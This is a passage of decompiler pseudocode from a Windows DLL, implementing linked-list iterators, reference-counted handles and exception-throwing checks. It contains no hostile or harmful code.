  *this = &off_10074728;
  *this = off_10072944;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10074728: using guessed type int (__thiscall *off_10074728)(void *Block, char);

//----- (10028A69) --------------------------------------------------------
int *__thiscall sub_10028A69(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10028DF5(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10028ABF: variable 'v5' is possibly undefined

//----- (10028AD1) --------------------------------------------------------
int *__thiscall sub_10028AD1(void *this, int *a2, unsigned int pExceptionObject)
{
  unsigned int v4; // eax
  int v5; // ecx
  unsigned int v6; // ebx

  v4 = (*(int (__thiscall **)(void *))(*(_DWORD *)this + 4))(this);
  if ( pExceptionObject > v4 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 8))(this, a2);
  if ( pExceptionObject )
  {
    v6 = pExceptionObject;
    do
    {
      sub_10028E35(v5, *a2);
      --v6;
    }
    while ( v6 );
  }
  return a2;
}
// 10028B27: variable 'v5' is possibly undefined

//----- (10028B39) --------------------------------------------------------
void __thiscall sub_10028B39(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 20))(this, v2);
  v3 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v2[0] + 28))(v2[0], a2);
  v3 = -1;
  sub_1002936B(v2);
}

//----- (10028B71) --------------------------------------------------------
void __thiscall sub_10028B71(void *this, int a2, int a3)
{
  int v3[4]; // [esp+10h] [ebp-14h] BYREF
  int v4; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v3, a3);
  v4 = 0;
  (*(void (__thiscall **)(int, int))(*(_DWORD *)v3[0] + 28))(v3[0], a2);
  v4 = -1;
  sub_1002936B(v3);
}

//----- (10028BAC) --------------------------------------------------------
void __thiscall sub_10028BAC(void *this, int a2)
{
  int v2[4]; // [esp+10h] [ebp-14h] BYREF
  int v3; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v2, a2);
  v3 = 0;
  (*(void (__thiscall **)(int))(*(_DWORD *)v2[0] + 24))(v2[0]);
  v3 = -1;
  sub_1002936B(v2);
}

//----- (10028BE4) --------------------------------------------------------
int __thiscall sub_10028BE4(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 24))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_100293EF(v4);
  return v2;
}

//----- (10028C20) --------------------------------------------------------
int __thiscall sub_10028C20(void *this, int a2)
{
  int v2; // esi
  int v4[4]; // [esp+10h] [ebp-14h] BYREF
  int v5; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *, int))(*(_DWORD *)this + 28))(this, v4, a2);
  v5 = 0;
  v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v4[0] + 12))(v4[0]);
  v5 = -1;
  sub_1002936B(v4);
  return v2;
}

//----- (10028C5C) --------------------------------------------------------
void __thiscall sub_10028C5C(void *this)
{
  int v1[4]; // [esp+10h] [ebp-14h] BYREF
  int v2; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(void *, int *))(*(_DWORD *)this + 12))(this, v1);
  v2 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v1[0] + 4))(v1[0]) )
    (*(void (__thiscall **)(int))(*(_DWORD *)v1[0] + 24))(v1[0]);
  v2 = -1;
  sub_1002936B(v1);
}

//----- (10028CB5) --------------------------------------------------------
_DWORD *__thiscall sub_10028CB5(_DWORD *Block, char a2)
{
  sub_10028867(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10028CD4) --------------------------------------------------------
int *__stdcall sub_10028CD4(int *Block)
{
  sub_10028D4E(Block);
  j__free(Block);
  return Block;
}

//----- (10028CEF) --------------------------------------------------------
_DWORD *__thiscall sub_10028CEF(_DWORD *Block, char a2)
{
  sub_10028A44(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10028D0E) --------------------------------------------------------
_DWORD *__thiscall sub_10028D0E(_DWORD *Block, char a2)
{
  *Block = &off_10074760;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074760: using guessed type int (__thiscall *off_10074760)(void *Block, char);

//----- (10028D2E) --------------------------------------------------------
_DWORD *__thiscall sub_10028D2E(_DWORD *Block, char a2)
{
  *Block = &off_10074780;
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}
// 10074780: using guessed type int (__thiscall *off_10074780)(void *Block, char);

//----- (10028D4E) --------------------------------------------------------
void __stdcall sub_10028D4E(int *a1)
{
  sub_1000F307(a1);
}

//----- (10028D6E) --------------------------------------------------------
void __usercall sub_10028D6E(int a1@<ecx>, int a2@<edi>)
{
  int v3; // eax
  int v4; // ecx
  int v5[4]; // [esp+10h] [ebp-14h] BYREF
  int v6; // [esp+20h] [ebp-4h]

  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 52))(a2);
  (*(void (__thiscall **)(int, int *))(*(_DWORD *)a1 + 8))(a1, v5);
  v6 = 0;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v5[0] + 4))(v5[0]) )
  {
    v3 = (*(int (__thiscall **)(int))(*(_DWORD *)v5[0] + 12))(v5[0]);
    (*(void (__thiscall **)(int, int))(*(_DWORD *)a2 + 36))(a2, v3);
    sub_10028E35(v4, v5[0]);
  }
  v6 = -1;
  sub_100293EF(v5);
}
// 10028DA7: variable 'v4' is possibly undefined

//----- (10028DCA) --------------------------------------------------------
_DWORD *__stdcall sub_10028DCA(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = off_10072944;
  *a1 = &off_10074728;
  return result;
}
// 10072944: using guessed type int (__thiscall *off_10072944[2])(void *Block, char);
// 10074728: using guessed type int (__thiscall *off_10074728)(void *Block, char);

//----- (10028DF5) --------------------------------------------------------
int __usercall sub_10028DF5@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10028E35) --------------------------------------------------------
int __usercall sub_10028E35@<eax>(int a1@<ecx>, int a2@<esi>)
{
  int pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  if ( (*(unsigned __int8 (__thiscall **)(int, int))(*(_DWORD *)a2 + 4))(a2, a1) )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  (*(void (__thiscall **)(int))(*(_DWORD *)a2 + 16))(a2);
  return a2;
}

//----- (10028E66) --------------------------------------------------------
_DWORD *__thiscall sub_10028E66(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10074760;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_100747A0;
  a2[3] = a3;
  return result;
}
// 10074760: using guessed type int (__thiscall *off_10074760)(void *Block, char);
// 100747A0: using guessed type int (__thiscall *off_100747A0)(void *Block, char);

//----- (10028EA0) --------------------------------------------------------
void __thiscall sub_10028EA0(_DWORD *this)
{
  *this = &off_100747A0;
  *this = &off_10074760;
}
// 10074760: using guessed type int (__thiscall *off_10074760)(void *Block, char);
// 100747A0: using guessed type int (__thiscall *off_100747A0)(void *Block, char);

//----- (10028EC5) --------------------------------------------------------
BOOL __thiscall sub_10028EC5(_DWORD *this)
{
  return this[3] == 0;
}

//----- (10028ECE) --------------------------------------------------------
BOOL __thiscall sub_10028ECE(_DWORD *this)
{
  return this[2] != 0;
}

//----- (10028ED7) --------------------------------------------------------
int __thiscall sub_10028ED7(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (10028EFB) --------------------------------------------------------
int __thiscall sub_10028EFB(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[3] = result;
  return result;
}

//----- (10028F28) --------------------------------------------------------
int __thiscall sub_10028F28(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[2] = result;
  return result;
}

//----- (10028F55) --------------------------------------------------------
int *__thiscall sub_10028F55(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 12);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 12) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 16) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10028CD4(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (10028FCB) --------------------------------------------------------
_DWORD *__thiscall sub_10028FCB(_DWORD *this, int a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[3]; // [esp-14h] [ebp-38h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x14u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000F58B(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_1002928D(Block, v6[0], v6[1], v6[2], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 12) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 16) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (10029050) --------------------------------------------------------
_DWORD *__thiscall sub_10029050(void *this, _DWORD *a2, int a3, int a4)
{
  _DWORD *result; // eax

  result = a2;
  *a2 = &off_10074780;
  a2[1] = this;
  a2[2] = a4;
  *a2 = &off_100747C0;
  a2[3] = a3;
  return result;
}
// 10074780: using guessed type int (__thiscall *off_10074780)(void *Block, char);
// 100747C0: using guessed type int (__thiscall *off_100747C0)(void *Block, char);

//----- (1002908A) --------------------------------------------------------
void __thiscall sub_1002908A(_DWORD *this)
{
  *this = &off_100747C0;
  *this = &off_10074780;
}
// 10074780: using guessed type int (__thiscall *off_10074780)(void *Block, char);
// 100747C0: using guessed type int (__thiscall *off_100747C0)(void *Block, char);

//----- (100290AF) --------------------------------------------------------
BOOL __thiscall sub_100290AF(_DWORD *this)
{
  return this[3] == 0;
}

//----- (100290B8) --------------------------------------------------------
BOOL __thiscall sub_100290B8(_DWORD *this)
{
  return this[2] != 0;
}

//----- (100290C1) --------------------------------------------------------
int __thiscall sub_100290C1(_DWORD *this)
{
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  result = this[3];
  if ( !result )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  return result;
}

//----- (100290E5) --------------------------------------------------------
int __thiscall sub_100290E5(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[3];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[2] = v1;
  result = *(_DWORD *)(v1 + 12);
  this[3] = result;
  return result;
}

//----- (10029112) --------------------------------------------------------
int __thiscall sub_10029112(_DWORD *this)
{
  int v1; // eax
  int result; // eax
  _DWORD *pExceptionObject; // [esp+0h] [ebp-4h] BYREF

  pExceptionObject = this;
  v1 = this[2];
  if ( !v1 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  this[3] = v1;
  result = *(_DWORD *)(v1 + 16);
  this[2] = result;
  return result;
}

//----- (1002913F) --------------------------------------------------------
int *__thiscall sub_1002913F(int this)
{
  int v2; // eax
  int v3; // edi
  int v4; // eax
  int v5; // eax
  int v6; // eax
  int *result; // eax
  int pExceptionObject; // [esp+8h] [ebp-4h] BYREF

  v2 = *(_DWORD *)(this + 12);
  if ( !v2 )
  {
    sub_1000E15A(&pExceptionObject);
    _CxxThrowException(&pExceptionObject, (_ThrowInfo *)&_TI2_AVTyxCkOnhqdgZuatyxcko_sr__);
  }
  v3 = *(_DWORD *)(v2 + 12);
  v4 = *(_DWORD *)(this + 8);
  if ( v4 )
    *(_DWORD *)(v4 + 12) = v3;
  if ( v3 )
    *(_DWORD *)(v3 + 16) = *(_DWORD *)(this + 8);
  v5 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v5 + 4) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v5 + 4) = v3;
  v6 = *(_DWORD *)(this + 4);
  if ( *(_DWORD *)(v6 + 8) == *(_DWORD *)(this + 12) )
    *(_DWORD *)(v6 + 8) = *(_DWORD *)(this + 8);
  result = *(int **)(this + 12);
  if ( result )
    result = sub_10028CD4(*(int **)(this + 12));
  *(_DWORD *)(this + 12) = v3;
  --*(_DWORD *)(*(_DWORD *)(this + 4) + 12);
  return result;
}

//----- (100291B5) --------------------------------------------------------
_DWORD *__thiscall sub_100291B5(_DWORD *this, int a2)
{
  _DWORD *result; // eax
  int v4; // ecx
  int v5; // ecx
  int v6[3]; // [esp-14h] [ebp-38h] BYREF
  int v7; // [esp-8h] [ebp-2Ch]
  int v8; // [esp-4h] [ebp-28h]
  int *v9; // [esp+10h] [ebp-14h]
  void *Block; // [esp+14h] [ebp-10h]
  int v11; // [esp+20h] [ebp-4h]

  ++*(_DWORD *)(this[1] + 12);
  Block = operator new(0x14u);
  v11 = 0;
  if ( Block )
  {
    v8 = this[2];
    v7 = this[3];
    v9 = v6;
    sub_1000F58B(a2, v6);
    LOBYTE(v11) = 0;
    result = sub_1002928D(Block, v6[0], v6[1], v6[2], v7, v8);
  }
  else
  {
    result = 0;
  }
  v11 = -1;
  v4 = this[2];
  if ( v4 )
    *(_DWORD *)(v4 + 12) = result;
  else
    *(_DWORD *)(this[1] + 4) = result;
  v5 = this[3];
  this[2] = result;
  if ( v5 )
    *(_DWORD *)(v5 + 16) = result;
  else
    *(_DWORD *)(this[1] + 8) = result;
  return result;
}

//----- (1002923A) --------------------------------------------------------
_DWORD *__thiscall sub_1002923A(_DWORD *Block, char a2)
{
  sub_10028EA0(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (10029259) --------------------------------------------------------
_DWORD *__thiscall sub_10029259(_DWORD *Block, char a2)
{
  sub_1002908A(Block);
  if ( (a2 & 1) != 0 )
    j__free(Block);
  return Block;
}

//----- (1002928D) --------------------------------------------------------
_DWORD *__stdcall sub_1002928D(_DWORD *a1, int a2, int a3, int a4, int a5, int a6)
{
  sub_1000F58B((int)&a2, a1);
  a1[3] = a5;
  a1[4] = a6;
  sub_1000F307(&a2);
  return a1;
}

//----- (100292D6) --------------------------------------------------------
_DWORD *__userpurge sub_100292D6@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1002932C) --------------------------------------------------------
_DWORD *__userpurge sub_1002932C@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (1002936B) --------------------------------------------------------
void __thiscall sub_1002936B(void *this)
{
  sub_10029432((int)this);
}

//----- (100293B0) --------------------------------------------------------
_DWORD *__userpurge sub_100293B0@<eax>(_DWORD *a1@<esi>, int a2)
{
  _DWORD *v2; // eax

  v2 = operator new(4u);
  if ( v2 )
    *v2 = 1;
  else
    v2 = 0;
  a1[1] = v2;
  *a1 = a2;
  return a1;
}

//----- (100293EF) --------------------------------------------------------
void __thiscall sub_100293EF(void *this)
{
  sub_1002946C((int)this);
}

//----- (10029432) --------------------------------------------------------
void __usercall sub_10029432(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (1002946C) --------------------------------------------------------
void __usercall sub_1002946C(int a1@<esi>)
{
  if ( !InterlockedDecrement(*(volatile LONG **)(a1 + 4)) )
  {
    if ( *(_DWORD *)(a1 + 4) )
      j__free(*(void **)(a1 + 4));
    if ( *(_DWORD *)a1 )
      (***(void (__thiscall ****)(_DWORD, int))a1)(*(_DWORD *)a1, 1);
  }
}

//----- (100294A8) --------------------------------------------------------
BOOL __userpurge sub_100294A8@<eax>(_DWORD *a1@<eax>, _DWORD *a2)
{
  int v2; // edi

  v2 = sub_10013422(a1);
  return v2 == sub_10013422(a2);
}

//----- (100294D3) --------------------------------------------------------
int __thiscall sub_100294D3(int *this, int a2)
{
  int v3; // ecx
  int v4; // eax
  int v6[2]; // [esp+Ch] [ebp-20h] BYREF
  _DWORD v7[3]; // [esp+14h] [ebp-18h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_10012C8B(this, v7);
  v8 = 0;
  (*(void (__thiscall **)(int *, int *))(this[9] + 12))(this + 9, v6);
  LOBYTE(v8) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v6[0] + 4))(v6[0]) )
  {
    if ( (*(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]) + 20) & a2) != 0 )
    {
      v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]);
      sub_10028766(*(_DWORD **)(v4 + 12));
    }
    sub_10010C0B(v3, v6[0]);
  }
  LOBYTE(v8) = 0;
  sub_10011AB1(v6);
  v8 = -1;
  return sub_10012CBF(v7);
}
// 1002954A: variable 'v3' is possibly undefined
// 100294D3: using guessed type _DWORD var_18[3];

//----- (1002958C) --------------------------------------------------------
int __thiscall sub_1002958C(int *this, int a2)
{
  int v3; // ecx
  int v4; // eax
  _DWORD v6[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v7[4]; // [esp+18h] [ebp-14h] BYREF
  int v8; // [esp+28h] [ebp-4h]

  sub_10012C8B(this, v6);
  v8 = 0;
  (*(void (__thiscall **)(int *, int *))(this[9] + 12))(this + 9, v7);
  LOBYTE(v8) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v7[0] + 4))(v7[0]) )
  {
    if ( (*(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20) & a2) != 0 )
    {
      v4 = (*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]);
      sub_10028686(*(_DWORD **)(v4 + 12));
    }
    sub_10010C0B(v3, v7[0]);
  }
  LOBYTE(v8) = 0;
  sub_10011AB1(v7);
  v8 = -1;
  return sub_10012CBF(v6);
}
// 100295DD: variable 'v3' is possibly undefined
// 1002958C: using guessed type _DWORD var_1C[2];

//----- (1002960E) --------------------------------------------------------
int __thiscall sub_1002960E(int *this)
{
  int v2; // eax
  int v3; // ecx
  _DWORD v5[2]; // [esp+10h] [ebp-1Ch] BYREF
  int v6[4]; // [esp+18h] [ebp-14h] BYREF
  int v7; // [esp+28h] [ebp-4h]

  sub_10012C8B(this, v5);
  v7 = 0;
  (*(void (__thiscall **)(int *, int *))(this[9] + 12))(this + 9, v6);
  LOBYTE(v7) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v6[0] + 4))(v6[0]) )
  {
    v2 = (*(int (__thiscall **)(int))(*(_DWORD *)v6[0] + 12))(v6[0]);
    if ( sub_10011FCC(v2) )
      sub_10010C0B(v3, v6[0]);
    else
      (*(void (__thiscall **)(int))(*(_DWORD *)v6[0] + 24))(v6[0]);
  }
  LOBYTE(v7) = 0;
  sub_10011AB1(v6);
  v7 = -1;
  return sub_10012CBF(v5);
}
// 1002965B: variable 'v3' is possibly undefined
// 1002960E: using guessed type _DWORD var_1C[2];

//----- (1002968A) --------------------------------------------------------
int *__stdcall sub_1002968A(int *a1, int *a2, int a3)
{
  int v3; // eax
  _DWORD *v4; // eax
  int v5; // eax
  _DWORD *v6; // esi
  _DWORD *v7; // eax
  int v8; // ecx
  int v10[3]; // [esp+10h] [ebp-34h] BYREF
  _DWORD v11[2]; // [esp+1Ch] [ebp-28h] BYREF
  int v12; // [esp+24h] [ebp-20h] BYREF
  char v13[8]; // [esp+28h] [ebp-1Ch] BYREF
  int v14; // [esp+30h] [ebp-14h]
  int v15; // [esp+40h] [ebp-4h]
  bool v16; // [esp+4Fh] [ebp+Bh]

  v15 = 0;
  v14 = 0;
  sub_10012C8B(a1, v11);
  v15 = 1;
  sub_10011A72(a2, 0);
  v3 = a1[9];
  v14 = 1;
  v4 = (_DWORD *)(*(int (__thiscall **)(int *, char *))(v3 + 12))(a1 + 9, v13);
  LOBYTE(v15) = 2;
  sub_10029A51(a2, v4);
  LOBYTE(v15) = 1;
  sub_10011AB1(v13);
  while ( !(*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)*a2 + 4))(*a2) )
  {
    v5 = (*(int (__thiscall **)(int))(*(_DWORD *)*a2 + 12))(*a2);
    v6 = sub_100114E7(v5, v10);
    LOBYTE(v15) = 3;
    v7 = sub_100114E7(a3, &v12);
    LOBYTE(v15) = 4;
    v16 = sub_100294A8(v6, v7);
    LOBYTE(v15) = 3;
    sub_10009696(&v12);
    LOBYTE(v15) = 1;
    sub_10009696(v10);
    if ( v16 )
      break;
    sub_10010C0B(v8, *a2);
  }
  LOBYTE(v15) = 0;
  sub_10012CBF(v11);
  return a2;
}
// 1002973C: variable 'v8' is possibly undefined
// 1002968A: using guessed type _DWORD var_28[2];
// 1002968A: using guessed type int var_34[3];

//----- (10029762) --------------------------------------------------------
int __usercall sub_10029762@<eax>(int a1@<ecx>, int *a2@<ebx>)
{
  int v3; // esi
  int v4; // esi
  _DWORD v6[2]; // [esp+10h] [ebp-20h] BYREF
  int v7[5]; // [esp+18h] [ebp-18h] BYREF
  int v8; // [esp+2Ch] [ebp-4h]

  sub_10012C8B(a2, v6);
  v8 = 0;
  sub_1002968A(a2, v7, a1);
  LOBYTE(v8) = 1;
  if ( (*(unsigned __int8 (__thiscall **)(int))(*(_DWORD *)v7[0] + 4))(v7[0]) )
  {
    (*(void (__thiscall **)(int *, int))(a2[9] + 36))(a2 + 9, a1);
  }
  else
  {
    v3 = *(_DWORD *)(a1 + 20);
    v4 = v3 | *(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20);
    *(_DWORD *)((*(int (__thiscall **)(int))(*(_DWORD *)v7[0] + 12))(v7[0]) + 20) = v4;
  }
  LOBYTE(v8) = 0;
  sub_10011AB1(v7);
  v8 = -1;
  return sub_10012CBF(v6);
}
// 10029762: using guessed type _DWORD var_20[2];

//----- (100297DF) --------------------------------------------------------
int __thiscall sub_100297DF(_DWORD *this, int *a2)
{
  int v3; // esi
  int v4; // edx
  int *v6; // [esp-8h] [ebp-34h]
  volatile LONG *v7; // [esp-4h] [ebp-30h]
  _DWORD v8[2]; // [esp+10h] [ebp-1Ch] BYREF
  int *v9; // [esp+18h] [ebp-14h] BYREF
  volatile LONG *v10; // [esp+1Ch] [ebp-10h]
  int v11; // [esp+28h] [ebp-4h]

  sub_10012C8B(a2, v8);
  v11 = 0;
  sub_1002968A(a2, (int *)&v9, (int)this);
  LOBYTE(v11) = 1;
  if ( !(*(unsigned __int8 (__thiscall **)(int *))(*v9 + 4))(v9) )
  {
    v3 = this[5];
    v7 = v10;
    v6 = v9;
    InterlockedIncrement(v10);
    LOBYTE(v11) = 1;
    sub_100298FF(v3, v4, v6, (int)v7);
  }
  LOBYTE(v11) = 0;
  sub_10011AB1(&v9);
  v11 = -1;
  return sub_10012CBF(v8);
}
// 10029841: variable 'v4' is possibly undefined
// 100297DF: using guessed type _DWORD var_1C[2];

//----- (10029866) --------------------------------------------------------
int __usercall sub_10029866@<eax>(int *a1@<ecx>, int a2@<ebx>)
{
  int v3; // ecx
  int v4; // edx
  int *v6; // [esp-8h] [ebp-38h] BYREF
  volatile LONG *v7; // [esp-4h] [ebp-34h]
  _DWORD v8[2]; // [esp+10h] [ebp-20h] BYREF
  int *v9; // [esp+18h] [ebp-18h] BYREF
  volatile LONG *v10; // [esp+1Ch] [ebp-14h]
  int **v11; // [esp+20h] [ebp-10h]
  int v12; // [esp+2Ch] [ebp-4h]

  sub_10012C8B(a1, v8);
  v12 = 0;
  (*(void (__thiscall **)(int *, int **))(a1[9] + 12))(a1 + 9, &v9);
  LOBYTE(v12) = 1;
  while ( !(*(unsigned __int8 (__thiscall **)(int *))(*v9 + 4))(v9) )
  {
    if ( (a2 & *(_DWORD *)((*(int (__thiscall **)(int *))(*v9 + 12))(v9) + 20)) != 0 )
    {
      v7 = v10;
      v11 = &v6;
      v6 = v9;
      InterlockedIncrement(v10);
      LOBYTE(v12) = 1;
      sub_100298FF(a2, v4, v6, (int)v7);
    }
    else
    {
      sub_10010C0B(v3, (int)v9);
    }
  }
  LOBYTE(v12) = 0;
  sub_10011AB1(&v9);
  v12 = -1;
  return sub_10012CBF(v8);
}
// 100298C6: variable 'v4' is possibly undefined
// 100298D0: variable 'v3' is possibly undefined
// 10029866: using guessed type _DWORD var_20[2];

//----- (100298FF) --------------------------------------------------------
void __fastcall sub_100298FF(int a1, int a2, int *a3, int a4)
{
  int *v4; // edi
  int v5; // esi
  int v6; // eax

  v4 = a3;
  v5 = *(_DWORD *)((*(int (__thiscall **)(int *))(*a3 + 12))(a3) + 20) & ~a1;
  v6 = *v4;
  if ( v5 )
    *(_DWORD *)((*(int (__thiscall **)(int *))(v6 + 12))(v4) + 20) = v5;
  else
    (*(void (__thiscall **)(int *))(v6 + 24))(v4);
  sub_10011AB1(&a3);
}

//----- (10029947) --------------------------------------------------------
